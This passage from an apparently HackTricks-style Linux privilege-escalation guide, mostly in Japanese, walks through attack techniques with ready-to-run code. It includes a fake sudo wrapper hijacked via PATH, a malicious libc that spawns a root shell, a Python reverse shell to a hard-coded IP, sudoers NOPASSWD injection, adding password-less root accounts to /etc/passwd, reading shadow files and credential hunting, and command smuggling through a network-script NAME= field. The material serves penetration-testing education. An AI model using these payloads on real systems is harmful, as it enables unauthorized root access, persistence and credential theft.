特定の**ユーザーが通常マシンに接続して`sudo`を使用する**ことが分かっていて、かつそのユーザーコンテキスト内でshellを取得している場合、あなたは**rootとして自分のコードを実行し、その後ユーザーのコマンドを実行する新しいsudo実行ファイルを作成**できます。次に、ユーザーコンテキストの**$PATH**（例：新しいパスを`.bash_profile`に追加する）を変更すれば、ユーザーがsudoを実行したときにあなたのsudo実行ファイルが実行されます。

ユーザーが別のshell（bash以外）を使用している場合は、新しいパスを追加するために他のファイルを編集する必要がある点に注意してください。例えば[ sudo-piggyback](https://github.com/APTy/sudo-piggyback)は`~/.bashrc`, `~/.zshrc`, `~/.bash_profile`を変更します。別の例は[bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)で確認できます。

または次のようなものを実行する:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## 共有ライブラリ

### ld.so

ファイル `/etc/ld.so.conf` は **読み込まれる設定ファイルがどこから来るか** を示します。通常、このファイルには次のパスが含まれます: `include /etc/ld.so.conf.d/*.conf`

つまり、`/etc/ld.so.conf.d/*.conf` からの設定ファイルが読み込まれます。この設定ファイルは **ライブラリが検索される他のフォルダを指します**。例えば、`/etc/ld.so.conf.d/libc.conf` の内容が `/usr/local/lib` であれば、**システムは `/usr/local/lib` の中でライブラリを検索します**。

何らかの理由で、指定されたパス：`/etc/ld.so.conf`、`/etc/ld.so.conf.d/`、`/etc/ld.so.conf.d/` 内の任意のファイル、または `/etc/ld.so.conf.d/*.conf` 内の設定ファイルが指す任意のフォルダに **ユーザーが書き込み権限を持っている** 場合、権限昇格が可能になることがあります。\
次のページで、このミスコンフィギュレーションを **どのように悪用するか** を確認してください:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
`/var/tmp/flag15/` に lib をコピーすると、`RPATH` 変数で指定されたとおり、プログラムはこの場所のものを使用します。
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
次に、`/var/tmp` に evil library を作成します: `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities provide a **プロセスに割り当て可能な root 権限のサブセット**。This effectively breaks up root **権限をより小さく独立した単位に分割する**。Each of these units can then be independently granted to processes。This way the full set of privileges is reduced, decreasing the risks of exploitation。\
Read the following page to **learn more about capabilities and how to abuse them**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Directory permissions

In a directory, the **bit for "execute"** implies that the user affected can "**cd**" into the folder。\
The **"read"** bit implies the user can **list** the **files**, and the **"write"** bit implies the user can **delete** and **create** new **files**。

## ACLs

Access Control Lists (ACLs) represent the secondary layer of discretionary permissions, capable of **overriding the traditional ugo/rwx permissions**。These permissions enhance control over file or directory access by allowing or denying rights to specific users who are not the owners or part of the group。This level of **granularity ensures more precise access management**。Further details can be found [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux)。

**Give** user "kali" read and write permissions over a file:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**取得する** システムから特定のACLsを持つファイル:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
### sudoers drop-ins にある隠された ACL backdoor

一般的な設定ミスとして、root所有でモードが `440` の `/etc/sudoers.d/` 内のファイルが、ACL によって低権限ユーザーに書き込みアクセスを与えてしまっている、というものがあります。
```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```
もし `user:alice:rw-` のようなものが見える場合、そのユーザーは制限的なモードビットがあっても sudo のルールを追加できます:
```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```
これは高いインパクトを持つ ACL persistence/privesc の経路です。`ls -l` のみのレビューでは見落としやすいからです。

## 開いている shell セッション

**古いバージョン**では、別のユーザー（**root**）のいくつかの**shell**セッションを**hijack**できることがあります。\
**最新のバージョン**では、**自分のユーザーアカウント**の screen セッションにのみ**connect**できるようになっています。しかし、セッション内で**興味深い情報**を見つけることがあります。

### screen セッションの hijacking

**screen セッションの一覧表示**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```
![](<../../images/image (141).png>)

**セッションにアタッチする**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux セッションの乗っ取り

これは**古い tmux バージョン**の問題でした。非特権ユーザーとして、root が作成した tmux (v2.1) セッションをハイジャックできませんでした。

**tmux セッションを一覧表示**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**セッションにアタッチする**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** for an example.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

2006年9月から2008年5月13日までの間にDebian系システム（Ubuntu、Kubuntuなど）で生成されたすべてのSSLおよびSSHキーは、この脆弱性の影響を受ける可能性があります。\
このバグは、これらのOSで新しい ssh キーを作成する際に発生し、**可能なバリエーションが32,768通りしかなかった**ためです。つまり、すべての可能性を計算でき、**ssh の公開鍵があれば対応する秘密鍵を検索できる**ことを意味します。計算済みの可能性はここで見つかります: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** パスワード認証が許可されるかどうかを指定します。デフォルトは `no` です。
- **PubkeyAuthentication:** 公開鍵認証が許可されるかどうかを指定します。デフォルトは `yes` です。
- **PermitEmptyPasswords**: パスワード認証が許可されている場合に、サーバーが空のパスワード文字列を持つアカウントへのログインを許可するかどうかを指定します。デフォルトは `no` です。

### Login control files

これらのファイルは誰がどのようにログインできるかに影響します:

- **`/etc/nologin`**: 存在する場合、root以外のログインをブロックし、そのメッセージを表示します。
- **`/etc/securetty`**: rootがログインできる場所を制限します（TTYの許可リスト）。
- **`/etc/motd`**: ログイン後のバナー（環境やメンテナンスの詳細を leak する可能性があります）。

### PermitRootLogin

rootがsshでログインできるかどうかを指定します。デフォルトは `no` です。考えられる値:

- `yes`: rootがパスワードおよび秘密鍵でログインできます
- `without-password` or `prohibit-password`: rootは秘密鍵でのみログインできます
- `forced-commands-only`: rootは秘密鍵でのみログインでき、かつコマンドオプションが指定されている場合に限ります
- `no`: 許可しない

### AuthorizedKeysFile

ユーザー認証に使用できる公開鍵を含むファイルを指定します。%h のようなトークンを含めることができ、ホームディレクトリに置き換えられます。**絶対パス**（`/`で始まる）または**ユーザーのホームからの相対パス**を指定できます。例えば:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
その設定は、ユーザ「**testusername**」の**private** keyでログインを試みると、sshがあなたのキーのpublic keyを`/home/testusername/.ssh/authorized_keys`と`/home/testusername/access`にあるものと比較することを示します。

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding は、サーバ上に（passphrasesなしで！）キーを置いたままにする代わりに、**use your local SSH keys instead of leaving keys**ことを可能にします。したがって、ssh経由で**jump**し**to a host**、そこから**jump to another**ホストへ**using**あなたの**initial host**にある**key**を使って接続できます。

このオプションは`$HOME/.ssh.config`に次のように設定する必要があります:
```
Host example.com
ForwardAgent yes
```
Notice that if `Host` is `*` every time the user jumps to a different machine, that host will be able to access the keys (which is a security issue).

ファイル `/etc/ssh_config` はこの **上書き** を行う **オプション** を持ち、この設定を許可または拒否できます。\
ファイル `/etc/sshd_config` はキーワード `AllowAgentForwarding` によって ssh-agent forwarding を **許可** または **拒否** できます（デフォルトは許可）。

環境で Forward Agent が設定されていることを確認したら、次のページを参照してください。**これは悪用して権限昇格できる可能性があります**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## 興味深いファイル

### Profiles ファイル

ファイル `/etc/profile` と `/etc/profile.d/` 以下のファイルは、ユーザーが新しいシェルを起動したときに**実行されるスクリプト**です。したがって、これらのいずれかを**書き込むまたは変更できる場合、権限昇格できます**。
```bash
ls -l /etc/profile /etc/profile.d/
```
もし不審なプロファイルスクリプトが見つかったら、**機密情報**が含まれていないか確認してください。

### Passwd/Shadow Files

OSによっては `/etc/passwd` や `/etc/shadow` ファイルが別名になっていたり、バックアップが存在する場合があります。したがって、**それらをすべて見つける**こと、そしてファイルを**読み取れるか確認する**ことを推奨します。ファイル内に**ハッシュがあるか**を確認するために:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
場合によっては、`/etc/passwd`（または同等のファイル）内に **password hashes** を見つけることがあります。
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### 書き込み可能な /etc/passwd

まず、次のいずれかのコマンドでパスワードを生成します。
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
次にユーザー `hacker` を追加し、生成されたパスワードを設定してください。
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
例: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

これで `su` コマンドを使って `hacker:hacker` を使用できます。

別の方法として、以下の行を使ってパスワードなしのダミーアカウントを追加できます。\
警告: マシンの現在のセキュリティが低下する可能性があります。
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
注意: BSDプラットフォームでは `/etc/passwd` は `/etc/pwd.db` と `/etc/master.passwd` にあり、また `/etc/shadow` は `/etc/spwd.db` に名前が変更されています。

いくつかの**機密ファイル**に書き込みできるかどうかを確認してください。例えば、いくつかの**サービス設定ファイル**に書き込みできますか？
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
例えば、マシンが **tomcat** サーバーを実行していて、**/etc/systemd/ 内の Tomcat サービス設定ファイルを変更できる** 場合、次の行を変更できます:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
あなたの backdoor は次回 tomcat が起動する際に実行されます。

### フォルダを確認

次のフォルダにはバックアップや興味深い情報が含まれている可能性があります: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (おそらく最後のものは読めないでしょうが、試してみてください)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### 奇妙な場所/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### 過去数分で変更されたファイル
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### SqliteのDBファイル
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml ファイル
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### 隠しファイル
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATH内のスクリプト/バイナリ**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Webファイル**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **バックアップ**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### パスワードを含む既知のファイル

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) のコードを読んでみてください。パスワードを含み得る**いくつかのファイルを検索**します。\
**もう一つ興味深いツール**として使えるのは: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) です。これは Windows、Linux & Mac のローカルコンピュータに保存された大量のパスワードを取得するためのオープンソースアプリケーションです。

### ログ

ログを読めるなら、**そこに興味深い/機密情報が含まれている**可能性があります。ログが奇妙であればあるほど（おそらく）より興味深いでしょう。\
また、一部の「**bad**」に設定された（backdoored?）**audit logs** は、監査ログ内に**パスワードを記録**させてしまう場合があり、次の投稿で説明されています: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
**ログを読むためのグループ** [**adm**](interesting-groups-linux-pe/index.html#adm-group) は非常に役立ちます。

### Shell files
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

ファイル名に「**password**」という語が含まれているものや、ファイルの**name**または**content**内に含まれているものを確認してください。また、ログ内のIPやemails、hashesやregexpsもチェックしてください。\
ここですべての方法を列挙するつもりはありませんが、興味があれば[**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh)が行う最後のチェックを確認してください。

## 書き込み可能なファイル

### Python library hijacking

もし**where**からpythonスクリプトが実行されることが分かっていて、そのフォルダに**can write inside**できる、または**modify python libraries**できるなら、OSライブラリを改変してbackdoorを仕込むことができます（pythonスクリプトが実行される場所に書き込み可能なら、os.pyライブラリをコピーして貼り付けてください）。

ライブラリを**backdoor the library**するには、os.pyライブラリの末尾に以下の行を追加してください（IPとPORTを変更してください）：
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate の悪用

`logrotate` の脆弱性により、ログファイルまたはその親ディレクトリに対して **書き込み権限** を持つユーザーが特権昇格を得る可能性があります。これは `logrotate` が多くの場合 **`root`** として動作しており、任意のファイルを実行するように操作され得るためで、特に _**/etc/bash_completion.d/**_ のようなディレクトリで問題になります。権限は _/var/log_ のみならず、ログローテーションが適用される任意のディレクトリでも確認することが重要です。

> [!TIP]
> この脆弱性は `logrotate` バージョン `3.18.0` 以下に影響します

この脆弱性の詳細情報は次のページで確認できます: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)。

この脆弱性は [**logrotten**](https://github.com/whotwagner/logrotten) で悪用できます。

この脆弱性は [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs)** と非常に類似しています。したがって、ログを変更できることが判明した場合は、それらのログを誰が管理しているかを確認し、ログをシンボリックリンクに置き換えて特権昇格できないかをチェックしてください。

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

何らかの理由で、ユーザーが `ifcf-<whatever>` スクリプトを _/etc/sysconfig/network-scripts_ に **書き込める**、または既存のスクリプトを **調整できる** 場合、あなたの **system is pwned** です。

Network scripts（例えば _ifcg-eth0_）はネットワーク接続に使用されます。見た目は .INI ファイルと全く同じです。しかし、これらは Linux 上で Network Manager (dispatcher.d) によって ~sourced~ されます。

私の場合、これらのネットワークスクリプト内の `NAME=` の取り扱いが正しくありませんでした。`NAME` に **空白が含まれていると、システムは空白以降の部分を実行しようとします**。つまり、**最初の空白以降の全てが root として実行されます**。

例えば： _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Network と /bin/id の間の空白に注意_)

### **init, init.d, systemd, and rc.d**

`/etc/init.d` ディレクトリは System V init (SysVinit) 用の **スクリプト** の格納場所で、**従来の Linux サービス管理システム** です。ここにはサービスを `start`、`stop`、`restart`、場合によっては `reload` するためのスクリプトが含まれます。これらは直接実行するか、`/etc/rc?.d/` にあるシンボリックリンク経由で実行できます。Redhat 系では代替パスとして `/etc/rc.d/init.d` が使われます。

一方、`/etc/init` は **Upstart** に関連付けられており、Ubuntu によって導入されたより新しい **サービス管理** で、サービス管理タスクに対して設定ファイルを使用します。Upstart への移行にも関わらず、互換レイヤーのために SysVinit スクリプトは Upstart の設定と並行して引き続き使用されます。

**systemd** はモダンな初期化およびサービスマネージャとして登場し、オンデマンドでのデーモン起動、automount の管理、システム状態のスナップショットなどの高度な機能を提供します。ファイルは配布パッケージ用に `/usr/lib/systemd/`、管理者が変更するために `/etc/systemd/system/` に整理されており、システム管理を効率化します。

## Other Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks は一般に syscall をフックして、特権付きのカーネル機能を userspace の manager に公開します。弱い manager 認証（例: FD-order に基づく署名チェックや脆弱なパスワード方式）は、ローカルアプリが manager を偽装して、既に root のデバイスで root 権限を奪うことを可能にします。詳しくは以下を参照:

{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

VMware Tools/Aria Operations における正規表現駆動の service discovery は、プロセスのコマンドラインからバイナリパスを抽出して、privileged コンテキストで -v オプション付きで実行する可能性があります。寛容なパターン（例: \S を使う）は、書き込み可能な場所（例: /tmp/httpd）に配置された攻撃者のリスナーと一致し、root としての実行（CWE-426 Untrusted Search Path）につながる恐れがあります。

詳しくは、他の discovery/monitoring スタックにも適用可能な一般化パターンを以下で参照してください:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [0xdf – HTB Slonik (pg_basebackup cron copy → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [0xdf – HTB: Expressway](https://0xdf.gitlab.io/2026/03/07/htb-expressway.html)

{{#include ../../banners/hacktricks-training.md}}
